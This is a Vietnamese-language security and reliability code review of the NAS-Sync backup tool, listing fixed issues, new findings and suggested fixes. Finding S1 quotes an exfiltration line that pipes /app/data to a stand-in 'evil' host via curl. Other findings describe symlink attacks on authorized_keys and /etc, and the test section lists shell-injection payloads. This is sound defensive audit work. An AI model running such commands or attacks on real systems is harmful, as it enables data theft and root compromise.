# Code Review lần 2 — nhánh `wnreview`

Re-review NAS-Sync từ `89de7ca` (merge PR #2, v1.2.0) đến `81dbf5b` (`main`, v1.5.6): 14 commit,
114 file, khoảng +26.700 / −3.300 dòng. Review này chỉ đọc code, không sửa code dự án.

## Đánh giá chung

Lớp xác thực và phân quyền đã tiến bộ rõ so với lần trước:

- Có `token_version` nên logout hay đổi mật khẩu sẽ vô hiệu các phiên cũ.
- Có kiểm tra `Origin` để chống CSRF và có 2FA TOTP.
- RBAC (ADMIN / OPERATOR / VIEWER) được kiểm tra ở 2 lớp và mặc định từ chối (fail-closed).
- Secret được mask khi trả về client.
- TOFU host key có khóa server khi key thay đổi.
- Retention đã có lock theo server.
- Đã có 19 test tự động chạy trong CI.

Kết quả: 4 agent review không tìm thấy lỗi Nghiêm trọng/Cao nào trong phần auth/API.

**Rủi ro lớn nhất còn lại nằm ở ranh giới "dữ liệu từ VPS/khách hosting → lệnh chạy bằng root".**

- **Nghiêm trọng:** file dump SQL lấy từ VPS được pipe thẳng vào client `mariadb`/`mysql`/`psql`
  mà không có `--binary-mode`. Một VPS bị chiếm có thể chạy lệnh bằng root trên NAS, nơi giữ SSH
  key của mọi VPS khác.
- **Cao:** có 2 lỗi TOCTOU/symlink cho phép khách hosting ghi đè file bất kỳ bằng quyền root trên
  VPS: config rewriter và khoảng hở giữa kiểm tra jail và lúc chạy rsync.

Mảng thứ hai cần ưu tiên là **độ tin cậy của hàng đợi**:

- Job đã COMPLETED/FAILED vẫn có thể bị chạy lại. Restore thất bại bị BullMQ retry tới 10 lần, mỗi
  lần chạy `rsync --delete` vào site production.
- Lệnh hủy không giết được pipeline `bash -c`.
- Job hết lượt retry nằm im ở INTERRUPTED mà không có cảnh báo nào.

Self-update vẫn thường xuyên rơi về nhánh `main` HEAD và không được xác thực.

## Trạng thái các mục còn mở từ review lần 1

| Mục cũ | Trạng thái | Bằng chứng |
|---|---|---|
| Retention xóa snapshot đang được restore | ✅ Đã sửa | Lock theo server ở `queue.ts:193-231`, route retention thủ công cũng lấy lock (`schedules/retention/route.ts:62`), bỏ qua snapshot mà restore QUEUED/RUNNING đang dùng (`retention-gfs.ts:39-88`). Còn hở nhỏ: explorer download/archive và `verify_sandbox` không lấy lock. |
| Self-update tải HEAD `main`, không checksum; `force` bỏ qua job đang chạy | ⚠️ Sửa một phần | `force` không còn bỏ qua kiểm tra job (`system/update/route.ts:36-42`, `updater.ts:886-889`). Đã có prebuilt + SHA-256, nhưng vẫn fallback về `main` HEAD mà không xác thực (xem **U1**, **U2**). |
| `GET /api/settings` trả secret dạng plaintext | ✅ Đã sửa | Mask `••••••••` và không ghi đè khi lưu lại giá trị mask (`settings/route.ts:18-30, 98, 181-187`). |
| DSM password đi qua query string GET | ✅ Đã sửa | Đã chuyển sang `POST` (`btrfs-worm.ts:43`). |
| Logout không vô hiệu JWT, đổi mật khẩu không kick phiên khác | ✅ Đã sửa | Tăng `token_version` khi logout, đổi mật khẩu, đổi role, reset 2FA; kiểm tra ở `server.ts:236` và `auth.ts:36-68`. |
| Không có CSRF | ✅ Đã sửa | `middleware.ts:47-76` kiểm tra `Origin`/`Referer`; Socket.IO kiểm tra ở `server.ts:312-320`. |
| `accept-new` + `+ssh-rsa`, chưa hiện fingerprint | ⚠️ Phần lớn đã sửa | Có TOFU pin theo server, MISMATCH thì khóa server, UI hiện fingerprint. Vẫn còn `+ssh-rsa`, nhánh fallback `accept-new` + `/dev/null`, và lỗi rescan (**S4**). |
| `resolveTargetWebroot` (cPanel/DA) nội suy trong `"..."` | ✅ Đã sửa | Dùng `shellSingleQuote` (`cpanel.ts:252-253`, `directadmin.ts:292-293`). |
| ssh/bash/fetch không có timeout hay cancel | ⚠️ Sửa một phần | Probe zstd 20s, watchdog 30 phút, btrfs 15s, `execRemoteSSH` 60s. Nhưng pipeline `bash -c` vẫn không giết được (**N2**) và sandbox import chưa được đăng ký cancel. |
| Verify/anomaly ném lỗi sau commit làm `latest` trỏ vào snapshot FAILED | ⚠️ Sửa một phần | `updateLatestSymlink` đã chuyển ra sau verify (`backup-worker.ts:619`). Vẫn còn **N12**. |
| Retention trộn UTC và giờ local | ✅ Đã sửa | `retention-gfs.ts:19-37, 136, 187, 206`. |
| Không có test tự động | ✅ Đã sửa | Có `tests/security-and-engine.test.ts` (19 test, chạy trong CI). |
| Không có ESLint | ❌ Còn mở | Vẫn không có file config ESLint và script `lint`. |
| `backup-worker.ts` quá dài | ✅ Đã sửa | Tách thành `mysql-streamer`, `postgres-streamer`, `rsync-runner`, `mock-runner`, `worker-state`; còn 777 dòng. |
| API trả nguyên văn `err.message` | ⚠️ Sửa một phần | Đã có `api-error.ts`, nhưng khoảng 25 handler vẫn trả thô (**A1**). |
| Dockerfile `npm install` + devDependencies | ⚠️ Sửa một phần | Đã dùng `npm ci`, nhưng vẫn `--include=dev` vì updater fallback cần `next build`. Container vẫn chạy root (không có `USER`). |

**Lỗi merge sót:** không có conflict marker hay dòng lặp. Chỉ có vài lỗi vặt:

- Dòng trống thừa cuối file ở `alerts/page.tsx`, `api/alerts/route.ts` và `types/index.ts`.
- Hai nhánh if/else cùng gọi `reloadCronSchedules()` (`settings/route.ts:166-170`).
- Allowlist có key trùng khác hoa thường `dsm_worm_Enabled` / `dsm_worm_enabled` (`settings/route.ts:53-54`).

## Phát hiện mới

### Bảo mật: shell, SSH, dữ liệu từ VPS

| # | Mức | Vị trí | Kịch bản lỗi | Đề xuất sửa |
|---|---|---|---|---|
| S1 | **Nghiêm trọng** | `sandbox-verifier.ts:54-60`, `restore-worker.ts:168-170`, `postgres-streamer.ts:247` | Dump SQL lấy từ VPS được pipe vào `mariadb` / `mysql` / `psql`. Cả repo không có chỗ nào dùng `--binary-mode`, `--sandbox` hay `\restrict`. Ở chế độ batch, các client này vẫn chạy meta-command `\! <lệnh shell>`. Hệ quả: (1) VPS bị chiếm trả về dump có dòng `\! sh -c 'tar c /app/data \| curl -T - http://evil'`, và sandbox verify (bật mặc định sau mỗi backup) chạy nó **bằng root trong container NAS**, nơi giữ SSH key của mọi VPS. (2) Khi restore chéo server, lệnh đó chạy bằng root trên VPS đích. Nếu không cần VPS bị chiếm: khách trên VPS có `mysqldump` cũ (CVE-2024-21096) có thể làm điều tương tự bằng tên bảng chứa xuống dòng (*cần xác nhận*). | Thêm `--binary-mode` (và `--sandbox` nếu client hỗ trợ) cho mọi lệnh import mysql/mariadb. Với PostgreSQL, dùng `\restrict` (PG ≥ 17.6 / 16.10) hoặc `pg_dump -Fc` + `pg_restore`. Chạy sandbox import ở container không có quyền đọc key, cho app chạy user non-root, và restore bằng user DB của khách thay vì root. |
| S2 | **Cao** | `config-rewriter.ts:138-144` | Script chỉ kiểm tra `$F` và thư mục cha, rồi chạy bằng root `cp -p -- "$F" "$F.nas-sync.bak"` và `cat > "$F.nas-sync.tmp.$$"`. `cp` và `>` đều ghi xuyên qua symlink đã có sẵn ở đích. Kịch bản: khi restore có `autoPatchConfig`, khách tạo trước `wp-config.php.nas-sync.bak -> /root/.ssh/authorized_keys` và đặt public key của mình trong `wp-config.php`. Root sẽ chép file đó vào `authorized_keys`, tức khách có SSH root. Cửa sổ thời gian kéo dài vài phút (restore DB cộng nhiều lượt SSH), nên không cần race chặt. | Tạo file bak/tmp bằng `mktemp` trong `$D_DIR` (O_EXCL), hoặc `rm -f` trước rồi dùng `cp --remove-destination`. Tốt nhất là chạy toàn bộ bước patch dưới user hệ thống của site. |
| S3 | **Cao** (restore) / Trung bình (backup) | `restore-worker.ts:457 → 470 → 482`, `backup-worker.ts:319 → 365`, `extended-hosting-backup.ts:540-596` | Lệnh kiểm tra jail (`verifyRemoteWebrootSafety`) và lệnh rsync chạy ở hai lượt SSH khác nhau, và rsync dùng path chưa resolve. Giữa hai lượt, khách đổi `public_html` thành symlink tới `/root/.ssh` hoặc `/etc`. Khi đó rsync root `--delete` ghi đè `authorized_keys` hoặc xóa sạch `/etc`. Ở chiều backup, kéo được `/etc/shadow` và `/root/.my.cnf` vào snapshot của khách, rồi lấy ra qua restore hoặc download. | Kiểm tra và chuyển dữ liệu trong cùng một lệnh: `--rsync-path='cd -P -- <real> && [ "$(pwd -P)" = <real> ] && exec rsync'` rồi rsync `.`. Tốt hơn nữa là chạy rsync phía remote bằng `sudo -u <user>`. |
| S4 | Trung bình | `ssh.ts:431-466` (rescan được gọi từ `ssh.ts:882-893`) | Sau một lần "Host key verification failed", rescan chấp nhận **toàn bộ** block key mới miễn có 1 key khớp với key cũ. MITM chuyển tiếp kết nối keyscan ed25519/ecdsa tới host thật và tự trả lời kết nối rsa bằng key của mình, thế là key RSA của kẻ tấn công được pin là VERIFIED. Vì có `+ssh-rsa`, các lần sau ssh chấp nhận key đó. | Chỉ tự động chấp nhận khi tập key quét được là tập con của key đã lưu; key mới hoặc đổi phải chuyển sang pending và chờ ADMIN duyệt. Bỏ `+ssh-rsa`. |
| S5 | Trung bình (*cần xác nhận*) | `base.ts:143-155` | Jail của CyberPanel cho phép mọi path `/home/*/*`, không gắn với home của user site. Chủ `a.com` symlink `public_html` sang `/home/victim.com/public_html`: backup sẽ kéo site của nạn nhân vào snapshot của a.com, còn restore a.com sẽ chạy `--delete` vào webroot của nạn nhân. | Bắt `$REAL` phải nằm trong home của `externalApp` (`getent passwd`) hoặc `/home/<domain>/`. |
| S6 | Trung bình (*cần xác nhận*) | `postgres-streamer.ts:36, 247` | Restore PostgreSQL bằng superuser với `--no-owner --no-privileges`, nên mọi object thành của `postgres`. Hàm `SECURITY DEFINER` của khách (ví dụ `COPY ... TO PROGRAM`) sẽ chạy với quyền superuser, cho khách shell dưới user postgres. Ngoài ra role của khách mất quyền trên các bảng vừa restore, nên site nhiều khả năng bị lỗi. | Restore bằng owner đích (`SET ROLE` / `pg_restore --role`). |

### Bảo mật: updater, release, offsite

| # | Mức | Vị trí | Kịch bản lỗi | Đề xuất sửa |
|---|---|---|---|---|
| U1 | **Cao** | `updater.ts:1078-1099, 945, 390-395, 1182-1200` | Updater bỏ gói prebuilt đã kiểm tra SHA-256 mỗi khi `main` HEAD khác commit của release. `force` luôn bỏ qua prebuilt, và `hasUpdate` bật lên sau mỗi lần push lên `main`. Trên thực tế, đường thường gặp là tải `codeload …/refs/heads/main` (không tag, không checksum), chạy `npm install` và `next build` rồi thực thi bằng root. Một lần push độc (hoặc token bị lộ) lan ra mọi NAS bấm "Cập nhật", bỏ qua cả tag lẫn CI. | Chỉ cập nhật theo tag release đã ký. Đưa `main` thành "kênh dev" phải bật thủ công. `force` chỉ cài lại bản release đã xác thực. |
| U2 | Trung bình | `updater.ts:982-1029`, `release.yml:33-47` | File `.sha256` nằm cùng release với tarball, nên ai sửa được asset thì sửa được cả hai. SHA-256 chỉ đảm bảo toàn vẹn, không xác thực nguồn gốc. | Ký detached (minisign hoặc cosign) và nhúng public key vào app, hoặc dùng GitHub artifact attestation. |
| U3 | Trung bình | `updater.ts:1141-1153, 1325-1337` (catch ở `1434-1443`) | `/app/node_modules` bị swap trước bước snapshot và kích hoạt. Nếu bước sau lỗi (ví dụ ENOSPC), khối catch chỉ xóa staging, để lại code cũ chạy với dependency mới và không có rollback. | Kích hoạt `node_modules` ở bước cuối cùng, hoặc backup lại và khôi phục trong catch. |
| U4 | Trung bình | `updater.ts:210-216, 1421-1423`, `offsite-cloud.ts:1239-1243`, `queue.ts:569` | Trong lúc build (có thể tới 15 phút), cron vẫn khởi chạy job mới, và upload offsite không được tính là job đang chạy. `process.exit(0)` sau đó cắt ngang chúng: multipart S3 bỏ dở, còn `offsite_sync_jobs` kẹt ở UPLOADING mãi mãi. | Scheduler và offsite phải tôn trọng cờ "đang cập nhật". Tính UPLOADING là job đang chạy. Khi khởi động, dọn các row UPLOADING bị kẹt. |
| E1 | Trung bình | `docker-entrypoint.sh:116-125` | `package.json` và lockfile bị ghi đè trước khi `npm install`. Nếu install lỗi (ví dụ mất mạng lúc boot), lần boot sau thấy dependency "đã giống", nên chạy code mới trên `node_modules` cũ và có thể crash loop. | Chỉ copy `package.json` sau khi install thành công, install vào thư mục tạm rồi mới swap, và dùng `npm ci`. |
| R1 | Trung bình | `release.yml:8-9, 17-18, 26-31` | Job release vừa có quyền `contents: write` vừa chạy `npm ci` (script cài đặt của dependency) với credential checkout được giữ lại. Một dependency độc có thể push lên repo hoặc thay asset cùng file `.sha256`. | Tách job build (`contents: read`, `persist-credentials: false`) khỏi job publish. Pin action theo SHA. Thêm `needs: release` cho job `docker-ghcr` (hiện image vẫn được đẩy lên dù test fail). |
| O1 | Trung bình (mất dữ liệu offsite) | `offsite-cloud.ts:1024-1026, 1051-1058` | Prune Google Drive dùng truy vấn `name contains 'nas-sync-web-'`, nên khớp luôn file của `nas-sync-web-2-…`. Push server `web` sẽ giữ N bản mới nhất **gộp chung cả hai server** và xóa bản offsite của `web-2`. Đã tự đọc code và xác nhận. | Lọc chính xác prefix + pattern tên snapshot ở phía client, hoặc gắn `appProperties.host` cho file rồi truy vấn theo đó. |
| O2 | Trung bình | `offsite-cloud.ts:13, 511-514` | Part multipart cố định 8 MiB mà S3/R2/B2 giới hạn 10.000 part, nên snapshot trên khoảng 78 GiB fail sau khi đã upload xong 78 GiB. | Tính kích thước part theo tổng dung lượng ước lượng và assert số part ≤ 10.000. |
| O3 | Trung bình | `offsite-cloud.ts:1202-1221`, `api/offsite/route.ts:73-87` | `push_snapshot` nhận job ở mọi trạng thái. OPERATOR có thể push thư mục dở dang của job RUNNING/FAILED; bản này được ghi COMPLETED và tính vào `keepCount`, đẩy một bản tốt ra khỏi danh sách giữ lại. | Bắt buộc `status='COMPLETED'` và server đó không có job đang chạy. |

### Độ tin cậy: hàng đợi, job, mất dữ liệu

| # | Mức | Vị trí | Kịch bản lỗi | Đề xuất sửa |
|---|---|---|---|---|
| N1 | **Cao** | `queue.ts:189, 207, 302-312`, `restore-worker.ts:713`, `backup-worker.ts:773` | `processJobPayload` chỉ bỏ qua job ở trạng thái CANCELLED. BullMQ mặc định `attempts: 10` và worker luôn `throw err` khi lỗi, nên **restore FAILED bị chạy lại tới 9 lần nữa**: mỗi lần là `rsync --delete` vào webroot production, import lại DB và gửi thêm một cảnh báo CRITICAL. Ngoài ra, job INTERRUPTED được dispatch lại với jobId mới khi khởi động, và nút "Thử lại" vẫn bấm được khi còn retry đang chờ, nên một job có thể chạy 2 lần. Nếu backup đã COMPLETED bị chạy lại và thất bại, snapshot tốt bị `rmSync` mất. Đã tự xác nhận phần (a). | Claim job nguyên tử: `UPDATE … SET status='RUNNING' WHERE id=? AND status IN ('QUEUED','INTERRUPTED')`. Ném `UnrecoverableError` cho lỗi không nên retry. Dùng jobId cố định. Chặn retry khi job đã COMPLETED hoặc đang INTERRUPTED chờ retry. |
| N2 | **Cao** | `restore-worker.ts:172-188`, `postgres-streamer.ts:250-267`, `sandbox-verifier.ts:58-65`, `worker-state.ts:39-55` | `terminateChildGracefully` chỉ gửi signal cho tiến trình `bash`, còn `zstd`, `ssh` và `mariadb` vẫn chạy và giữ pipe mở, nên `'close'` không bao giờ phát. Hủy restore DB không có tác dụng. Timeout 10 phút của sandbox cũng vô hiệu: job kẹt ở VERIFYING và giữ lock cùng slot hàng đợi mãi mãi. | Spawn với `detached: true` rồi `process.kill(-pid)`, hoặc tách decompressor và ssh thành hai child riêng, nối pipe trong Node. |
| N3 | **Cao** | `explorer/archive/route.ts:154-161` | Route enqueue mọi chunk của tar mà không kiểm tra `desiredSize` (không có backpressure). Client chậm cộng snapshot lớn làm heap Node phình không giới hạn, OOM làm sập tiến trình kéo theo mọi backup đang chạy. | Dùng `Readable.toWeb(child.stdout)` hoặc stream pull-based có pause/resume. |
| N4 | **Cao** | `backup-worker.ts:716-732`, `queue.ts:258, 349`, `morning-digest.ts:369` | Khi hết lượt retry, job ở lại INTERRUPTED vĩnh viễn: không có alert CRITICAL, không gửi Telegram, và digest chỉ đếm FAILED. Một VPS offline khoảng 4 giờ có thể khiến backup đêm đó mất trong im lặng. | Ở lần thử cuối, chuyển job sang FAILED và gửi alert CRITICAL. |
| N5 | **Cao** (*cần xác nhận khi chạy thật*) | `restore-worker.ts:194-214`, `postgres-streamer.ts:273-293`, `sandbox-verifier.ts:11, 71-86` | Watchdog idle chỉ coi stdout/stderr là hoạt động, mà client mysql không in gì khi import. Vì vậy mọi restore MySQL dài hơn 30 phút bị kill với lỗi "Idle Timeout". Giới hạn cứng 10 phút của sandbox khiến DB lớn bị đánh CORRUPTED và cảnh báo mỗi đêm. | Tính byte đọc từ file dump là hoạt động. Scale timeout sandbox theo kích thước dump. |
| N6 | Trung bình | `backup-worker.ts:151, 703-773` | Thư mục `.in_progress_<snapshot>` không bao giờ bị xóa khi job FAILED/CANCELLED. Mỗi đêm lỗi để lại dữ liệu thay đổi cộng cả cây thư mục cho đến khi đầy đĩa. | Xóa khi FAILED/CANCELLED (giữ lại khi INTERRUPTED), và quét dọn các `.in_progress_*` cũ lúc khởi động. |
| N7 | Trung bình | `queue.ts:285-294, 349` | Ở Local mode, job QUEUED mất khi restart (hàng đợi `localPending` nằm trong RAM) và kẹt ở QUEUED mãi. Server cũng kẹt ở `BACKUP_RUNNING`. Recovery khi khởi động không tăng `retry_count`, nên job làm crash tiến trình có thể gây crash loop. | Khi khởi động, dispatch lại các job QUEUED và tăng `retry_count` cho job được recover. |
| N8 | Trung bình | `queue.ts:200, 247` | Job tăng `localRunningCount++` (và chiếm slot BullMQ) *trước* khi chờ lock server. Hai job xếp sau một backup dài của cùng server đã chiếm hết 3 slot, làm các server khác bị đói. | Kiểm tra lock trước khi chiếm slot, hoặc requeue job khi server đang bận. |
| N9 | Trung bình | `notifications.ts:53, 237-256` | Alert CRITICAL chứa toàn bộ stderr của rsync (có thể trên 32 KB) trong khi Telegram giới hạn 4096 ký tự, và lỗi bị nuốt mất do gọi kiểu `void`. Kết quả là alert quan trọng nhất không bao giờ tới nơi. | Cắt message còn khoảng 3500 ký tự và log lỗi gửi. |
| N10 | Trung bình | `servers/[id]/route.ts:43, 125`, `explorer.ts:48`, `retention-gfs.ts:226` | Đổi `hostname` của server làm mọi snapshot cũ thành mồ côi: không restore hay duyệt được, retention xóa row trong DB nhưng file vẫn nằm trên đĩa, và lần backup sau là bản full. | Khóa trường hostname khi server đã có snapshot, hoặc lưu đường dẫn snapshot theo `server_id`. |
| N11 | Trung bình (*cần xác nhận*) | `restore-worker.ts:495` | `chown -hR` dưới nice/ionice dùng timeout mặc định 60s của `execRemoteSSH`. Webroot lớn vượt thời gian này nên restore bị đánh FAILED dù file đã push xong. | Truyền timeout dài hơn, hoặc dùng watchdog idle cho bước này. |
| N12 | Trung bình | `backup-worker.ts:566, 579-631` | Nếu verify/anomaly ném lỗi sau khi snapshot đã được rename vào chỗ (ví dụ sandbox container restart), job bị FAILED. Snapshot tốt bị ẩn khỏi restore (chỉ liệt kê COMPLETED) và retention cũng không bao giờ dọn nó. `refreshAllVolumes()` ném lỗi sau `updateLatestSymlink` cũng gây ra tình trạng FAILED trong khi `latest` vẫn trỏ vào snapshot đó. | Sau commit, bắt lỗi verify/anomaly theo từng DB và đánh dấu UNTESTED thay vì làm fail cả job. |

### Thấp

| # | Vị trí | Vấn đề |
|---|---|---|
| A1 | khoảng 25 route (`auth/login:175`, `auth/me:195`, `auth/2fa:366`, `users/*`, `jobs/*`, `schedules/*`, `ssh-keys`, `system/update`, `volumes/*`, `restore`, `explorer/*`, `gdrive-oauth:252`) | Vẫn trả nguyên văn `err.message`, trong đó `login` không cần xác thực. Nên dùng `safeErrorJson` thống nhất. |
| A2 | `server.ts:136-149` và `api/alerts/route.ts:20, 110-130` | Bảng RBAC trong `server.ts` thiếu `/api/alerts`, nên VIEWER/OPERATOR nhận 403 (đã xác nhận khi chạy thử) và badge cùng trang `/alerts` hỏng với user không phải admin. Không khai thác được, chỉ là 2 bảng RBAC bị lệch nhau. |
| A3 | `server.ts:312-332` | Socket.IO chỉ kiểm tra `token_version` lúc handshake, nên socket mở từ trước khi logout hoặc đổi role vẫn nhận log và alert. VIEWER cũng nhận cả tiến trình update. |
| A4 | `totp.ts:138-175`, `auth/2fa/route.ts:122-180` | TOTP không chống replay (một mã dùng lại được trong khoảng 90s). Bật 2FA không tăng `token_version`. |
| A5 | `totp.ts:10-22` | Khóa mã hóa TOTP và HMAC của recovery code được dẫn xuất từ `JWT_SECRET`, nên xoay `JWT_SECRET` sẽ khóa ngoài mọi user có 2FA. |
| A6 | `auth/login/route.ts:62` | User không tồn tại thì bỏ qua scrypt, nên dò được username qua thời gian phản hồi. |
| A7 | `audit.ts:40-49` | Khi `TRUST_PROXY=true` mà cổng NAS vẫn truy cập trực tiếp được, giả mạo `X-Forwarded-For` sẽ bypass được login throttle. Cần ghi rõ điều này trong tài liệu. |
| A8 | `api/schedules/route.ts:7`, `api/volumes/route.ts:120`, `api/jobs/[id]/route.ts:70` | Các handler GET chỉ dựa vào lớp chặn của `server.ts` và không có `requireRole` riêng (phòng thủ nhiều lớp). |
| S7 | `ssh.ts:660-667, 733-738` | Nhánh fallback `accept-new` + `UserKnownHostsFile=/dev/null` vẫn còn. Hiện mọi đường gọi đều pin key trước, nhưng nhánh này nên ném lỗi thay vì mở. |
| S8 | `ssh.ts:165, 187-200` | Thư mục ControlMaster cố định ở `/tmp/.nas_ssh_mux` và không kiểm tra owner hay symlink. Nên chuyển vào `DATA_DIR`. |
| S9 | `aapanel.ts` (`find … -exec chmod`) | Race đổi file thành symlink giữa `find` và `chmod` làm `chmod` đi theo symlink. Nên dùng `chmod -h` hoặc chạy bằng user `www`. |
| S10 | `btrfs-worm.ts:36, 48` | Mặc định bỏ qua kiểm tra TLS của DSM (trừ khi `DSM_TLS_VERIFY=true`), nên mật khẩu admin DSM có thể lộ cho MITM. |
| S11 | `directadmin.ts:26-28`, `cpanel.ts:22-24`, `cyberpanel.ts:21-27`, `hestiacp.ts:24-27` | Mật khẩu MySQL admin được kéo về NAS nhưng không hề được dùng. Nên bỏ. |
| U5 | `updater.ts:1353-1367` | SHA ghi vào BUILD_INFO lấy từ một lần gọi API thứ hai, sau khi tải tarball, nên có thể lệch với code thực tế. Nên tải `tar.gz/<sha>` theo đúng SHA đã resolve. |
| O4 | `offsite-cloud.ts:1286-1314` | tar lỗi sau khi upload xong để lại object mồ côi. Không giới hạn số push chạy song song. |
| O5 | `offsite-cloud.ts:222-226, 366-370` | Endpoint S3 cho phép trỏ tới IP nội bộ và echo lại body phản hồi (SSRF; chỉ ADMIN cấu hình được). |
| O6 | `offsite-cloud.ts:937-981` | Retry resumable Google Drive không hỏi offset server đã nhận trước khi gửi lại (*cần xác nhận*). |
| C1 | `offsite-crypto.ts:7, 127-132` | Header (salt, chunkSize) không nằm trong AAD. PBKDF2 210k vòng thấp hơn khuyến nghị 600k và tham số KDF không được lưu trong header. `pbkdf2Sync` chặn event loop. CLI decrypt nhận passphrase qua argv. |
| R2 | `release.yml`, `update-synology.sh:33-42` | Action chỉ pin theo major tag. Script trên host vẫn kéo `main` HEAD và `cp -rf` ghi đè `docker-compose.yml` mà user đã sửa. |
| N13 | `volume-manager.ts:19` | `ln -snf` không nguyên tử và không kiểm tra exit code. Nên tạo symlink tạm rồi `rename`. |
| N14 | `queue.ts:144-152` | Ba trigger trong cùng một giây sinh trùng tên snapshot, và lần commit sau `rm -rf` snapshot của job trước. |
| N15 | `servers/route.ts:64`, `servers/[id]/route.ts:50` | Bật được `is_mock` cho server production qua API mà không có chặn theo môi trường. Việc này bỏ qua TOFU và tạo ra backup "COMPLETED" giả. |
| N16 | `server.ts` | Không có handler `unhandledRejection`/`uncaughtException`. ENOSPC trong listener `'close'` của probe zstd (`mysql-streamer.ts:74-116`) sẽ làm sập tiến trình. |
| N17 | `explorer.ts:340`, `sandbox-verifier.ts:153-174`, `rsync-runner.ts:14`, `queue.ts:594-597`, `db.ts` | `diffLines` đồng bộ trên 5 MB chặn event loop. Dump `.zst` ở Local Inspector chỉ được kiểm tra magic bytes. rsync exit 23 bị retry 10 lần. Snapshot btrfs chạy cố định 15 phút sau enqueue chứ không chờ backup xong. Các migration cột của bảng users dùng chung một try/catch. |

## Kiểm tra đã chạy

- `git fetch` rồi fast-forward `wnreview` lên `origin/main` (`81dbf5b`, không cần force-push).
- Chạy cục bộ đúng các lệnh CI (`.github/workflows/ci.yml`), Node 24, Windows. Tất cả pass:
  - `npm ci`
  - `npm run typecheck`
  - `npm test`: 19/19 test, 8/8 suite
  - `npm run build`
- `git diff --check 89de7ca HEAD`: chỉ báo dòng trống thừa cuối file; không có conflict marker.
- Agent auth chạy thử server production cục bộ (DATA_DIR tạm, tài khoản test) và xác nhận:
  - CSRF: POST với `Origin` lạ trả 403.
  - VIEWER nhận 403 khi: tạo user, tự nâng role, đọc settings, đọc ssh-keys.
  - Token cũ sau logout trả 401.
  - PUT settings với giá trị mask không ghi đè secret.
  - Không bypass được lớp chặn bằng `//api` hay `/%61pi`.
  - VIEWER bị 403 ở `/api/alerts` (mục A2).
- Đã chạy thử:
  - Validator `safe-names` với các payload `$(id)`, `;`, xuống dòng, `..`, `-` đứng đầu: đều bị chặn.
  - Mã hóa offsite: bit-flip, cắt cụt file, đảo chunk, sai passphrase đều bị từ chối; CLI decrypt fail-closed.
  - Node 24 fetch: bỏ header `Authorization` khi redirect sang origin khác.
- Đã tự đọc code để xác nhận: S1 (không có `--binary-mode`), S2, S4, U1, O1, N1, N2, N3.
- **Chưa test được:** khai thác thật với VPS DirectAdmin/cPanel/CyberPanel/PostgreSQL (S1, S3, S5, S6), restore DB lớn hơn 30 phút (N5, N11), và BullMQ/Redis thật (N1b stalled job).

## Đề xuất thứ tự xử lý

1. **S1:** thêm `--binary-mode` là sửa được một dòng mỗi chỗ và chặn ngay đường RCE vào NAS.
2. **S2, S3:** symlink/TOCTOU khi chạy root trên VPS.
3. **N1, N2, N4:** job chạy lại hoặc không hủy được, và job hết retry mà không cảnh báo.
4. **U1:** updater chỉ cập nhật theo release đã ký.
5. **O1, N3, N5, N6:** mất dữ liệu offsite, OOM, timeout giả, rò rỉ dung lượng đĩa.
6. Các mục Trung bình và Thấp còn lại.
